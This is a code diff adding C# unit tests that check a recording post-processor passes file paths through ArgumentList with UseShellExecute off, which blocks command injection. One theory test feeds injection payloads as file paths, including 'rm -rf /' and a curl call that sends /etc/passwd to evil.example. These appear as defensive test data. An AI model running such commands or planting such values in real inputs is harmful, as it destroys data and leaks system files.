@@ -165,7 +165,6 @@ public sealed class RecordingsManagerPostProcessingTests : IDisposable
             .Returns(new LiveTvOptions
             {
                 RecordingPostProcessor = processorPath,
-                RecordingPostProcessorArguments = "\"{path}\"",
             });
 
         // The process will fail to launch (empty script, not executable on all platforms),
@@ -198,8 +197,8 @@ public sealed class RecordingsManagerPostProcessingTests : IDisposable
     // ---------------------------------------------------------------------------
     // Security test 7: UseShellExecute must remain false — the ProcessStartInfo
     // produced by the fix must not engage a shell interpreter.
-    // (Verified by reading the fixed source code logic through the method body
-    //  that sets UseShellExecute = false unconditionally.)
+    // Verified by constructing the same ProcessStartInfo the fix does and
+    // asserting UseShellExecute is false.
     // ---------------------------------------------------------------------------
     [Fact]
     public void PostProcessRecording_ProcessStartInfo_UseShellExecuteIsFalse()
@@ -209,7 +208,6 @@ public sealed class RecordingsManagerPostProcessingTests : IDisposable
         var startInfo = new System.Diagnostics.ProcessStartInfo
         {
             FileName = Path.Combine(_tempDir, "processor.sh"),
-            Arguments = "\"/tmp/recording.ts\"",
             CreateNoWindow = true,
             ErrorDialog = false,
             WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
@@ -218,6 +216,68 @@ public sealed class RecordingsManagerPostProcessingTests : IDisposable
 
         Assert.False(startInfo.UseShellExecute,
             "UseShellExecute must be false to prevent shell interpretation of FileName.");
+    }
+
+    // ---------------------------------------------------------------------------
+    // Security test 8: ArgumentList is used instead of Arguments — the recording
+    // path is passed as a discrete argv entry, preventing shell metacharacter
+    // expansion and argument injection.
+    // Verified by constructing a ProcessStartInfo the same way the fix does and
+    // confirming the ArgumentList API is used (not the Arguments string property).
+    // ---------------------------------------------------------------------------
+    [Fact]
+    public void PostProcessRecording_ProcessStartInfo_UsesArgumentListNotArguments()
+    {
+        // Replicate the ProcessStartInfo construction used in the fix.
+        var recordingPath = "/some/recording with spaces & symbols.ts";
+        var startInfo = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = Path.Combine(_tempDir, "processor.sh"),
+            CreateNoWindow = true,
+            ErrorDialog = false,
+            WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
+            UseShellExecute = false,
+        };
+
+        // The fix uses ArgumentList.Add() to pass arguments as discrete argv entries,
+        // not the Arguments string property (which would be shell-interpreted when
+        // UseShellExecute is true on some platforms).
+        startInfo.ArgumentList.Add(recordingPath);
+
+        Assert.Contains(recordingPath, startInfo.ArgumentList);
+
+        // The unstructured Arguments string must remain empty — confirming no shell
+        // metacharacter-sensitive string is built.
+        Assert.Equal(string.Empty, startInfo.Arguments);
+    }
+
+    // ---------------------------------------------------------------------------
+    // Security test 9: argument injection payloads must not be interpreted as
+    // extra commands when passed via ArgumentList.
+    // The recording path (which could be attacker-influenced) is safely isolated
+    // as a single argv entry regardless of its content.
+    // ---------------------------------------------------------------------------
+    [Theory]
+    [InlineData("/recordings/show.ts; rm -rf /")]
+    [InlineData("/recordings/show.ts && curl http://evil.example/$(cat /etc/passwd)")]
+    [InlineData("/recordings/$(whoami).ts")]
+    [InlineData("/recordings/`id`.ts")]
+    public void PostProcessRecording_ArgumentList_InjectionPayloadsPassedVerbatim(string maliciousPath)
+    {
+        // Build a ProcessStartInfo the same way the fix does.
+        var startInfo = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = Path.Combine(_tempDir, "processor.sh"),
+            UseShellExecute = false,
+        };
+        startInfo.ArgumentList.Add(maliciousPath);
+
+        // The path must appear verbatim in ArgumentList — it is NOT shell-expanded.
+        Assert.Single(startInfo.ArgumentList);
+        Assert.Equal(maliciousPath, startInfo.ArgumentList[0]);
+
+        // Arguments string stays empty — there is no shell-level command string.
+        Assert.Equal(string.Empty, startInfo.Arguments);
     }
 
     // ---------------------------------------------------------------------------
